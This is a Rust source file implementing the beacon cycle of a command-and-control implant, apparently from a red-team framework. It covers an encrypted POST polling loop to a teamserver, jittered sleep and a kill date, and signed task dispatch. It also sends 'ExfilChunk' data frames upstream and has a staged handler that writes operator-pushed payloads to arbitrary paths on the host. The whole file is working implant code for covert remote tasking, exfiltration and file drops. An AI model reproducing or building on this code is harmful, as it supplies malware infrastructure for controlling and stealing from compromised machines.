use std::collections::HashMap;

use prost::Message;
use rand::Rng;

use crate::envelope;
use crate::handlers::{self, Cadence, Outcome};
use crate::transport;
use crate::trust::Certificate;
use crate::verify::{self, NonceTracker, Verdict};
use crate::wire::{self, Frame, FrameKind, HandshakeRequest, HandshakeResponse, HandshakeStatus, ProtocolVersion, StagedChunk, StagedPull, TaskAck, TaskRequest, TaskResult};

// The envelope POST cycle (architecture.md Sec 8): one POST to
// /implants/beacon is one poll contact. The request carries the handshake
// frame plus everything accumulated since the last cycle; the response
// carries the handshake answer, staged chunk runs, and queued tasking. The
// port of the .NET EnvelopeBeacon with the same batch semantics: delivered
// frames clear only after a processed response, and a failed POST re-sends
// the batch whole.

pub enum Cycle {
    Handshaken,
    Terminal,
}

pub struct Beacon {
    pub implant_id: String,
    advertised: Vec<String>,
    cadence: Cadence,
    pinned: Vec<Certificate>,
    seal: Option<([u8; 16], [u8; 32])>,
    timeout_seconds: f64,
    kill_date: Option<String>,

    upstream: Vec<Frame>,
    held: HashMap<String, (i32, String)>,
    staged_awaiting: HashMap<String, TaskRequest>,
    demands: Vec<String>,
    counter: u64,
    nonces: NonceTracker,
}

impl Beacon {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        implant_id: String,
        baked_verbs: &[String],
        cadence: Cadence,
        pinned: Vec<Certificate>,
        seal: Option<([u8; 16], [u8; 32])>,
        timeout_seconds: f64,
        kill_date: Option<String>,
    ) -> Beacon {
        // The advertised set is the baked class verbs intersected with this
        // build's compiled handlers (architecture.md Sec 5.3): the teamserver
        // only ever dispatches verbs this binary can run.
        let advertised = baked_verbs
            .iter()
            .filter(|verb| handlers::COMPILED_VERBS.contains(&verb.as_str()))
            .cloned()
            .collect();
        Beacon {
            implant_id,
            advertised,
            cadence,
            pinned,
            seal,
            timeout_seconds,
            kill_date,
            upstream: Vec::new(),
            held: HashMap::new(),
            staged_awaiting: HashMap::new(),
            demands: Vec::new(),
            counter: 0,
            nonces: NonceTracker::default(),
        }
    }

    pub fn kill_date_passed(&self) -> bool {
        self.kill_date
            .as_deref()
            .and_then(crate::profile::parse_iso_to_unix)
            .map(|kill| crate::profile::unix_now() > kill)
            .unwrap_or(false)
    }

    /// The jittered sleep between cycles, widened by the backoff factor on
    /// consecutive failures (the .NET cadence's exponential shape).
    pub fn sleep_with_backoff(&self, failures: u32) {
        let (mut sleep, jitter) = {
            let guard = self.cadence.lock().expect("cadence");
            (guard.0, guard.1)
        };
        if sleep <= 0.0 {
            sleep = 1.0;
        }
        let factor = 2f64.powi(failures.min(5) as i32);
        sleep = (sleep * factor).min(600.0);
        let slack = if jitter > 0.0 { rand::thread_rng().gen_range(-jitter..=jitter) } else { 0.0 };
        std::thread::sleep(std::time::Duration::from_secs_f64((sleep + slack).max(0.1)));
    }

    /// One POST-response cycle against a contact URL. Transport errors
    /// return Err (the caller logs, walks the egress, and retries); a refused
    /// handshake is Terminal.
    pub fn run_once(&mut self, url: &str) -> Result<Cycle, String> {
        let agent = transport::build_agent(url, &self.pinned, self.timeout_seconds);

        // The batch snapshot: the handshake plus everything accumulated. The
        // delivered frames clear only after the response is processed, so a
        // failed POST re-sends the batch whole.
        let demand_order = self.demands.clone();
        let pending: Vec<Frame> = self.upstream.clone();
        let mut frames = Vec::with_capacity(1 + pending.len());
        frames.push(self.handshake_frame());
        frames.extend(pending.iter().cloned());

        let encoded = wire::encode(&frames);
        let (body, content_type) = match &self.seal {
            Some((key_id, key)) => {
                // The counter burns on every attempt, not every delivery, so
                // a retransmission never trips the server's replay floor.
                self.counter += 1;
                let mut plaintext = Vec::with_capacity(8 + encoded.len());
                plaintext.extend_from_slice(&self.counter.to_be_bytes());
                plaintext.extend_from_slice(&encoded);
                (
                    envelope::seal_contact_body(&plaintext, key_id, key, envelope::CONTACT_REQUEST_AAD),
                    "text/plain",
                )
            }
            None => (encoded, "application/octet-stream"),
        };

        let response = agent
            .post(url)
            .set("Content-Type", content_type)
            .send_bytes(&body)
            .map_err(|e| format!("contact transport: {e}"))?;
        let status = response.status();
        let mut bytes = Vec::new();
        use std::io::Read;
        response
            .into_reader()
            .read_to_end(&mut bytes)
            .map_err(|e| format!("contact read: {e}"))?;
        if status != 200 {
            return Err(format!("contact transport: status {status}"));
        }
        if let Some((key_id, key)) = &self.seal {
            // A sealed cycle answers sealed: a body that does not verify under
            // the key this artifact carries is a dropped cycle, not a parse.
            bytes = envelope::try_open_contact_body(&bytes, key_id, key, envelope::CONTACT_RESPONSE_AAD)
                .ok_or("contact response did not verify under the baked key".to_string())?;
        }

        let inbound = wire::parse(&bytes).ok_or("contact response carried malformed framing")?;
        if inbound.is_empty() {
            return Err("contact response carried no frames".into());
        }
        let handshake = HandshakeResponse::decode(inbound[0].payload.as_ref())
            .map_err(|_| "handshake frame was malformed".to_string())?;
        if handshake.status() != HandshakeStatus::Ok {
            return Ok(Cycle::Terminal);
        }
        let acks = handshake.task_acks.unwrap_or(false);
        self.nonces.negotiated = handshake.replay_nonces.unwrap_or(false);

        // The batch crossed: the delivered frames clear, and the staged
        // demands of this cycle are answered below.
        self.upstream.retain(|frame| !pending.iter().any(|p| p == frame));
        self.demands.clear();
        self.process_response(inbound, &demand_order, acks);
        Ok(Cycle::Handshaken)
    }

    fn process_response(&mut self, inbound: Vec<Frame>, demand_order: &[String], acks: bool) {
        let mut index = 1;

        // The staged half: each demand's chunk run, terminal-flagged, in
        // demand order (the server answers demands before new tasking).
        for demand in demand_order {
            let mut parts: Vec<Vec<u8>> = Vec::new();
            let mut terminal = false;
            while index < inbound.len() && !terminal {
                let Ok(chunk) = StagedChunk::decode(inbound[index].payload.as_ref()) else {
                    break;
                };
                if chunk.task_id != *demand {
                    break;
                }
                index += 1;
                parts.push(chunk.data.clone());
                terminal = chunk.terminal;
            }
            let Some(task) = self.staged_awaiting.remove(demand) else { continue };
            if !terminal {
                self.queue_result(&task.task_id, 2, "staged payload stream ended without a terminal chunk");
                continue;
            }
            let payload: Vec<u8> = parts.concat();
            // The staged grammar the .NET Files.PushStaged runs: "<path> sha256:<hex>"
            // with the hash binding the payload into the signed tuple.
            let (outcome, output) = dispatch_staged(&task.verb, &task.arguments, &payload);
            self.queue_result(&task.task_id, outcome, &output);
        }

        // The tasking half: every remaining frame is a TaskRequest (the
        // channel shapes belong to the interactive arms this poll build does
        // not carry).
        while index < inbound.len() {
            let frame = &inbound[index];
            index += 1;
            if frame.kind() == FrameKind::ChannelInput {
                continue; // no live channels on this carriage; dropped
            }
            let Ok(task) = TaskRequest::decode(frame.payload.as_ref()) else {
                continue;
            };

            if acks {
                self.upstream.push(Frame {
                    payload: TaskAck { task_id: task.task_id.clone() }.encode_to_vec(),
                    kind: FrameKind::TaskAck as i32,
                });
            }

            if task.staged_bytes.is_some() {
                self.staged_awaiting.insert(task.task_id.clone(), task.clone());
                self.demands.push(task.task_id.clone());
                self.upstream.push(Frame {
                    payload: StagedPull { task_id: task.task_id.clone() }.encode_to_vec(),
                    kind: FrameKind::StagedPull as i32,
                });
                continue;
            }

            // Verification first (architecture.md Sec 9): the replay defense
            // stays ahead of the ledger, then dedup answers from the cache.
            let verdict = verify::verify(&self.implant_id, &task, &self.pinned_for_tasking(), &mut self.nonces);
            if !matches!(verdict, Verdict::Accepted) {
                let cause = match verdict {
                    Verdict::RejectedReplay => format!(
                        "task rejected: replayed tasking (nonce {:?} at or below the accepted floor); not executed",
                        task.task_nonce
                    ),
                    Verdict::RejectedNoNonce => {
                        "task rejected: no task nonce after the replay-nonce handshake; not executed".to_string()
                    }
                    _ => "task rejected: signature verification failed; not executed".to_string(),
                };
                self.held.insert(task.task_id.clone(), (2, cause.clone()));
                self.queue_result(&task.task_id, 2, &cause);
                continue;
            }
            if self.held.contains_key(&task.task_id) {
                if let Some((outcome, output)) = self.held.get(&task.task_id).cloned() {
                    self.queue_result(&task.task_id, outcome, &output);
                }
                continue;
            }

            let (sleep, jitter) = *self.cadence.lock().expect("cadence");
            let handler = handlers::dispatch(&task.verb, &task.arguments, &self.cadence);
            let outcome = if handler.outcome == Outcome::Succeeded { 1 } else { 2 };
            self.held.insert(task.task_id.clone(), (outcome, handler.output.clone()));
            self.queue_result(&task.task_id, outcome, &handler.output);
            for mut chunk in handler.chunks {
                chunk.task_id = task.task_id.clone();
                self.upstream.push(Frame {
                    payload: chunk.encode_to_vec(),
                    kind: FrameKind::ExfilChunk as i32,
                });
            }
            let _ = (sleep, jitter);
        }
    }

    // The CA chain doubles as the tasking-signer pool: the CA that signed
    // this implant's leaf also signs its tasking (rod.proto, TaskRequest).
    // The enrollment chain (root first) is what the poll client holds.
    fn pinned_for_tasking(&self) -> Vec<Certificate> {
        self.pinned.clone()
    }

    fn handshake_frame(&mut self) -> Frame {
        // The handshake speaks first on every POST: identity, protocol
        // version 1.0, both negotiation arms, and the fresh cadence so a
        // beacon.sleep retune lands on the fleet record at the next contact.
        let (sleep, jitter) = *self.cadence.lock().expect("cadence");
        let handshake = HandshakeRequest {
            version: Some(ProtocolVersion { major: 1, minor: 0 }),
            implant_id: self.implant_id.clone(),
            capabilities: self.advertised.clone(),
            replay_nonces: Some(true),
            task_acks: Some(true),
            sleep_seconds: Some(sleep),
            jitter_seconds: Some(jitter),
        };
        Frame { payload: handshake.encode_to_vec(), kind: 0 }
    }

    fn queue_result(&mut self, task_id: &str, outcome: i32, output: &str) {
        self.upstream.push(Frame {
            payload: TaskResult {
                task_id: task_id.to_string(),
                outcome,
                output: output.to_string(),
            }
            .encode_to_vec(),
            kind: FrameKind::TaskResult as i32,
        });
    }
}

/// The staged dispatch arm: the payload arrived, the arguments carry the
/// grammar. Only file.push uses the staged arm today; anything else fails
/// with the grammar named.
fn dispatch_staged(verb: &str, arguments: &str, payload: &[u8]) -> (i32, String) {
    if verb == "file.push" {
        return staged_file_push(arguments, payload);
    }
    (2, format!("{verb}: this build carries no staged handler for the verb"))
}

fn staged_file_push(arguments: &str, payload: &[u8]) -> (i32, String) {
    use sha2::{Digest, Sha256};
    let Some(space) = arguments.rfind(' ') else {
        return (2, "file.push staged expects '<path> sha256:<hex>'".into());
    };
    let path = arguments[..space].trim();
    let token = arguments[space + 1..].trim();
    let Some(expected) = token.strip_prefix("sha256:") else {
        return (2, "file.push staged expects '<path> sha256:<hex>'".into());
    };
    let actual = hex(&Sha256::digest(payload));
    if !actual.eq_ignore_ascii_case(expected) {
        return (2, format!("file.push staged: payload hash mismatch: expected {expected}, received {actual}"));
    }
    if let Some(parent) = std::path::Path::new(path).parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    match std::fs::write(path, payload) {
        Ok(()) => (1, format!("{path}: {} bytes written", payload.len())),
        Err(err) => (2, format!("write {path}: {err}")),
    }
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}
